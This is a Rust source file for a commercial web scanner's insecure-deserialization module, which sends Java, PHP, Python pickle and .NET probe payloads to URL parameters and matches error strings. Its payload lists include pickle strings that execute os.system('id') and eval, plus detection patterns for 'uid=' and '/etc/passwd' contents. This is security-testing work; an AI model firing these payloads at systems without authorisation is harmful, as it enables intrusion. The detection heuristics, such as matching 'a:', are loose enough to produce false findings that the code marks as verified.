// Copyright (c) 2025 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - Deserialization Scanner
 * Tests for insecure deserialization vulnerabilities
 *
 * Detects:
 * - Java deserialization (ysoserial payloads)
 * - PHP unserialization (__wakeup, __destruct)
 * - Python pickle/cPickle deserialization
 * - .NET BinaryFormatter/DataContractSerializer
 * - Ruby Marshal deserialization
 * - Code execution via deserialization
 *
 * @copyright 2025 Bountyy Oy
 * @license Proprietary
 */

use crate::http_client::HttpClient;
use crate::scanners::parameter_filter::{ParameterFilter, ScannerType};
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use std::sync::Arc;
use tracing::{debug, info};

pub struct DeserializationScanner {
    http_client: Arc<HttpClient>,
}

impl DeserializationScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    /// Scan a parameter for deserialization vulnerabilities
    pub async fn scan_parameter(
        &self,
        url: &str,
        param_name: &str,
        _config: &ScanConfig,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        // Smart parameter filtering - skip framework internals
        if ParameterFilter::should_skip_parameter(param_name, ScannerType::Other) {
            debug!("[Deser] Skipping framework/internal parameter: {}", param_name);
            return Ok((Vec::new(), 0));
        }

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        info!("[Deser] Testing deserialization on parameter: {} (priority: {})",
              param_name,
              ParameterFilter::get_parameter_priority(param_name));

        // Test different serialization formats
        let test_cases = vec![
            ("java", self.get_java_payloads()),
            ("php", self.get_php_payloads()),
            ("python", self.get_python_payloads()),
            ("dotnet", self.get_dotnet_payloads()),
        ];

        for (language, payloads) in test_cases {
            for (payload, description) in payloads {
                tests_run += 1;

                // Try both GET and POST
                if let Ok((vulnerable, evidence)) = self.test_payload(
                    url,
                    param_name,
                    &payload,
                    language,
                ).await {
                    if vulnerable {
                        info!("Deserialization vulnerability detected: {} - {}", language, &description);
                        vulnerabilities.push(self.create_vulnerability(
                            url,
                            param_name,
                            &payload,
                            language,
                            &description,
                            &evidence,
                        ));
                        return Ok((vulnerabilities, tests_run)); // Found vulnerability
                    }
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Scan endpoint for deserialization vulnerabilities
    pub async fn scan(
        &self,
        url: &str,
        config: &ScanConfig,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        // Only test parameters discovered from actual forms/URLs - no spray-and-pray
        // The main scanner will call scan_parameter() with discovered params
        Ok((Vec::new(), 0))
    }

    /// Test a deserialization payload
    async fn test_payload(
        &self,
        url: &str,
        param_name: &str,
        payload: &str,
        language: &str,
    ) -> anyhow::Result<(bool, String)> {
        // Determine content type based on language
        let content_type = match language {
            "java" => "application/x-java-serialized-object",
            "php" => "application/x-php-serialized",
            "python" => "application/octet-stream",
            "dotnet" => "application/octet-stream",
            _ => "application/octet-stream",
        };

        // For short payloads, use GET
        if payload.len() < 200 {
            let test_url = if url.contains('?') {
                format!("{}&{}={}", url, param_name, urlencoding::encode(payload))
            } else {
                format!("{}?{}={}", url, param_name, urlencoding::encode(payload))
            };

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    let (vulnerable, evidence) = self.analyze_response(
                        &response.body,
                        response.status_code,
                        language,
                    );
                    Ok((vulnerable, evidence))
                }
                Err(e) => {
                    debug!("GET request failed: {}", e);
                    Ok((false, String::new()))
                }
            }
        } else {
            // For long payloads, use POST
            let headers = vec![
                ("Content-Type".to_string(), content_type.to_string()),
            ];

            match self.http_client.post_with_headers(url, payload, headers).await {
                Ok(response) => {
                    let (vulnerable, evidence) = self.analyze_response(
                        &response.body,
                        response.status_code,
                        language,
                    );
                    Ok((vulnerable, evidence))
                }
                Err(e) => {
                    debug!("POST request failed: {}", e);
                    Ok((false, String::new()))
                }
            }
        }
    }

    /// Get Java deserialization payloads
    fn get_java_payloads(&self) -> Vec<(String, String)> {
        vec![
            // ysoserial gadget chain indicators
            ("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA3hwAAAAAP////90AAB0AAQvZXhjdAAJbG9jYWxob3N0dAAEaHR0cHg=".to_string(), "Java ObjectInputStream".to_string()),

            // Error-based detection payloads
            ("O:8:\"stdClass\":0:{}".to_string(), "Java format test".to_string()),
            ("aced0005".to_string(), "Java magic bytes".to_string()),

            // Command execution
            ("AC ED 00 05".to_string(), "Java serialization header".to_string()),
        ]
    }

    /// Get PHP unserialization payloads
    fn get_php_payloads(&self) -> Vec<(String, String)> {
        vec![
            // Basic PHP object
            ("O:8:\"stdClass\":1:{s:4:\"test\";s:5:\"value\";}".to_string(), "PHP stdClass".to_string()),

            // Magic method triggers
            ("O:4:\"Test\":1:{s:4:\"data\";s:3:\"pwn\";}".to_string(), "PHP object with data".to_string()),

            // Array serialization
            ("a:2:{i:0;s:4:\"test\";i:1;s:5:\"value\";}".to_string(), "PHP array".to_string()),

            // Property access
            ("O:8:\"stdClass\":2:{s:4:\"name\";s:5:\"admin\";s:4:\"role\";s:5:\"admin\";}".to_string(), "PHP admin object".to_string()),

            // Null byte injection
            ("O:4:\"Test\":1:{s:5:\"test\\0\";s:5:\"value\";}".to_string(), "PHP null byte".to_string()),
        ]
    }

    /// Get Python pickle payloads
    fn get_python_payloads(&self) -> Vec<(String, String)> {
        vec![
            // Pickle protocol markers
            ("\\x80\\x03}q\\x00.".to_string(), "Python pickle v3".to_string()),
            ("cos\nsystem\n(S'id'\ntR.".to_string(), "Python RCE via os.system".to_string()),
            ("c__builtin__\neval\n(S'__import__(\"os\").system(\"id\")'\ntR.".to_string(), "Python eval RCE".to_string()),

            // Detection payload
            ("(dp0\nS'test'\np1\nS'value'\np2\ns.".to_string(), "Python pickle dict".to_string()),
        ]
    }

    /// Get .NET deserialization payloads
    fn get_dotnet_payloads(&self) -> Vec<(String, String)> {
        vec![
            // .NET BinaryFormatter header
            ("AAEAAAD/////".to_string(), ".NET BinaryFormatter".to_string()),

            // XML serialization
            ("<ObjectDataProvider>".to_string(), ".NET ObjectDataProvider".to_string()),

            // ViewState
            ("/wEPDwUKMTIzNDU2Nzg5MA9k".to_string(), ".NET ViewState".to_string()),
        ]
    }

    /// Analyze response for deserialization indicators
    fn analyze_response(
        &self,
        body: &str,
        status_code: u16,
        language: &str,
    ) -> (bool, String) {
        match language {
            "java" => {
                let indicators = vec![
                    "java.io.InvalidClassException",
                    "java.io.StreamCorruptedException",
                    "java.io.ObjectInputStream",
                    "java.lang.ClassNotFoundException",
                    "readObject",
                    "ObjectInputStream",
                    "ysoserial",
                    "InvocationTargetException",
                    "java.lang.reflect",
                    "sun.reflect",
                ];

                for indicator in indicators {
                    if body.contains(indicator) {
                        return (true, format!("Java deserialization detected: {}", indicator));
                    }
                }
            }

            "php" => {
                // Check for O:NUM:" pattern (PHP object serialization) first
                if let Ok(regex) = regex::Regex::new(r"O:\d+:") {
                    if regex.is_match(body) {
                        return (true, "PHP object serialization pattern detected".to_string());
                    }
                }

                let indicators = vec![
                    "unserialize()",
                    "__wakeup",
                    "__destruct",
                    "a:",  // Array marker
                    "PHP Notice",
                    "PHP Warning",
                    "Class '",
                    "' not found",
                ];

                for indicator in indicators {
                    if body.contains(indicator) {
                        return (true, format!("PHP deserialization detected: {}", indicator));
                    }
                }
            }

            "python" => {
                let indicators = vec![
                    "pickle",
                    "UnpicklingError",
                    "__reduce__",
                    "cPickle",
                    "loads(",
                    "module 'os'",
                    "module '__builtin__'",
                    "PickleError",
                ];

                for indicator in indicators {
                    if body.contains(indicator) {
                        return (true, format!("Python deserialization detected: {}", indicator));
                    }
                }
            }

            "dotnet" => {
                let indicators = vec![
                    "BinaryFormatter",
                    "DataContractSerializer",
                    "NetDataContractSerializer",
                    "ObjectStateFormatter",
                    "System.Runtime.Serialization",
                ];

                for indicator in indicators {
                    if body.contains(indicator) {
                        return (true, format!(".NET deserialization detected: {}", indicator));
                    }
                }
            }

            _ => {}
        }

        // Check for command execution indicators
        let cmd_indicators = vec![
            "uid=", "gid=",  // Unix id command
            "root:x:0:0",  // passwd file
            "Administrator",  // Windows
            "NT AUTHORITY",
        ];

        for indicator in cmd_indicators {
            if body.contains(indicator) {
                return (true, format!("Code execution via deserialization: {}", indicator));
            }
        }

        // Check for error-based indicators
        if status_code == 500 || status_code == 501 {
            if body.to_lowercase().contains("deserializ") ||
               body.to_lowercase().contains("unserializ") {
                return (true, "Deserialization error detected".to_string());
            }
        }

        (false, String::new())
    }

    /// Create a vulnerability record
    fn create_vulnerability(
        &self,
        url: &str,
        param_name: &str,
        payload: &str,
        language: &str,
        description: &str,
        evidence: &str,
    ) -> Vulnerability {
        let payload_display = if payload.len() > 200 {
            format!("{}...", &payload[..200])
        } else {
            payload.to_string()
        };

        Vulnerability {
            id: format!("deser_{}", uuid::Uuid::new_v4()),
            vuln_type: format!("Insecure Deserialization ({})", language.to_uppercase()),
            severity: Severity::Critical,
            confidence: Confidence::High,
            category: "Injection".to_string(),
            url: url.to_string(),
            parameter: Some(param_name.to_string()),
            payload: payload_display,
            description: format!(
                "Insecure deserialization ({}) in parameter '{}': {}",
                language, param_name, description
            ),
            evidence: Some(evidence.to_string()),
            cwe: "CWE-502".to_string(),
            cvss: 9.8,
            verified: true,
            false_positive: false,
            remediation: format!(
                "1. Never deserialize untrusted data\n\
                 2. Use JSON or XML instead of language-specific serialization\n\
                 3. Implement integrity checks (HMAC) on serialized data\n\
                 4. Restrict deserialization classes (allowlist)\n\
                 5. {} specific: {}",
                language,
                match language {
                    "java" => "Use look-ahead deserialization, ObjectInputFilter (Java 9+)",
                    "php" => "Disable unserialize(), use json_decode()",
                    "python" => "Use json module instead of pickle, implement __reduce_ex__",
                    "dotnet" => "Avoid BinaryFormatter, use secure alternatives",
                    _ => "Use secure serialization formats"
                }
            ),
            discovered_at: chrono::Utc::now().to_rfc3339(),
        }
    }
}

// UUID generation helper
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::http_client::HttpClient;
    use std::sync::Arc;

    fn create_test_scanner() -> DeserializationScanner {
        let http_client = Arc::new(HttpClient::new(30, 3).unwrap());
        DeserializationScanner::new(http_client)
    }

    #[test]
    fn test_analyze_java_deserialization() {
        let scanner = create_test_scanner();

        let body = "Error: java.io.InvalidClassException: Invalid class";
        let (vulnerable, evidence) = scanner.analyze_response(body, 500, "java");

        assert!(vulnerable);
        assert!(evidence.contains("InvalidClassException"));
    }

    #[test]
    fn test_analyze_php_unserialize() {
        let scanner = create_test_scanner();

        let body = "PHP Warning: unserialize(): Error at offset 0";
        let (vulnerable, evidence) = scanner.analyze_response(body, 500, "php");

        assert!(vulnerable);
        assert!(evidence.contains("unserialize"));
    }

    #[test]
    fn test_analyze_php_object_pattern() {
        let scanner = create_test_scanner();

        let body = "O:8:\"stdClass\":1:{s:4:\"test\";s:5:\"value\";}";
        let (vulnerable, evidence) = scanner.analyze_response(body, 200, "php");

        assert!(vulnerable);
        assert!(evidence.contains("object serialization"));
    }

    #[test]
    fn test_analyze_python_pickle() {
        let scanner = create_test_scanner();

        let body = "pickle.UnpicklingError: invalid load key";
        let (vulnerable, evidence) = scanner.analyze_response(body, 500, "python");

        assert!(vulnerable);
        assert!(evidence.contains("pickle"));
    }

    #[test]
    fn test_analyze_command_execution() {
        let scanner = create_test_scanner();

        let body = "uid=1000(user) gid=1000(user)";
        let (vulnerable, evidence) = scanner.analyze_response(body, 200, "java");

        assert!(vulnerable);
        assert!(evidence.contains("Code execution"));
        assert!(evidence.contains("uid="));
    }

    #[test]
    fn test_analyze_dotnet_binary_formatter() {
        let scanner = create_test_scanner();

        let body = "System.Runtime.Serialization.BinaryFormatter error";
        let (vulnerable, evidence) = scanner.analyze_response(body, 500, "dotnet");

        assert!(vulnerable);
        assert!(evidence.contains("BinaryFormatter"));
    }

    #[test]
    fn test_analyze_safe_response() {
        let scanner = create_test_scanner();

        let body = "Normal page content without deserialization";
        let (vulnerable, _) = scanner.analyze_response(body, 200, "java");

        assert!(!vulnerable);
    }

    #[test]
    fn test_get_java_payloads() {
        let scanner = create_test_scanner();
        let payloads = scanner.get_java_payloads();

        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|(p, _)| p.contains("rO0")));
    }

    #[test]
    fn test_get_php_payloads() {
        let scanner = create_test_scanner();
        let payloads = scanner.get_php_payloads();

        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|(p, _)| p.starts_with("O:")));
    }

    #[test]
    fn test_create_vulnerability() {
        let scanner = create_test_scanner();

        let vuln = scanner.create_vulnerability(
            "http://example.com/api",
            "data",
            "O:8:\"stdClass\":0:{}",
            "php",
            "PHP object deserialization",
            "unserialize() detected",
        );

        assert_eq!(vuln.vuln_type, "Insecure Deserialization (PHP)");
        assert_eq!(vuln.severity, Severity::Critical);
        assert_eq!(vuln.cwe, "CWE-502");
        assert_eq!(vuln.cvss, 9.8);
        assert!(vuln.verified);
    }

    #[test]
    fn test_payload_truncation() {
        let scanner = create_test_scanner();

        let long_payload = "A".repeat(300);
        let vuln = scanner.create_vulnerability(
            "http://example.com",
            "data",
            &long_payload,
            "java",
            "Test",
            "Test evidence",
        );

        assert!(vuln.payload.len() < 210);
        assert!(vuln.payload.ends_with("..."));
    }
}
